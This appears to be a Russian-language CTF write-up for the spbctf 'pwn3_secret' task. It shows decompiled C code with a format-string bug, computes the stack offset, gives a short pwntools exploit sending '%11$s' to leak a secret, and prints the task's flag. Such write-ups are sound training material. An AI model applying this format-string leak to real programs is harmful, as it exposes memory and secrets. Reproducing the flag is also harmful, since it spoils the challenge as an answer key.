[Tasks :: pwn.spbctf.ru](https://pwn.spbctf.ru/tasks/pwn3_secret)
Описание:
Форматные строки говоришь? Окай...
`nc 109.233.56.90 11630`
**[secret.elf](https://pwn.spbctf.ru/files/aslr/secret/secret.elf)**

Необходимо при помощи уязвимости форматной строки прочесть переменную `s`, а затем отправить её.
``` C
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  size_t len; // rax
  char user_input[32]; // [rsp+0h] [rbp-30h] BYREF
  char format[8]; // [rsp+20h] [rbp-10h] BYREF
  char *s; // [rsp+28h] [rbp-8h]

  s = rand_str();

  puts("Where is a secret?..");
  printf("Payload: ");
  safe_fgets(format, 8u, stdin);
  puts("Hmmm...");
  printf(format);

  printf("\nSecret: ");
  safe_fgets(user_input, 32u, stdin);
  len = strlen(s);

  if ( !strncmp(s, user_input, len) )
    print_flag();
  else
    puts("Nope");

  free(s);
  exit(0);
}
```
Адрес `s`: 6 (регистры) + 4 (user_input) + 1 (format) = 11.
Получается, чтобы прочитать `s` со стека необходимо ввести `%11$s`.

Эксплоит:
``` python
io = start()

io.sendlineafter(b'Payload: ', b'%11$s')
io.recvline()
s = io.recvline()
io.sendlineafter(b'Secret:', s)

io.interactive()
```

Запуск:
![{05B3ACC8-84A8-401A-85BD-4C95E474AD0A}](../../../../z.%20Images/{05B3ACC8-84A8-401A-85BD-4C95E474AD0A}.png)

Ответ: `spbctf{a6a187fca1a645cae80e49390cff8c9d}`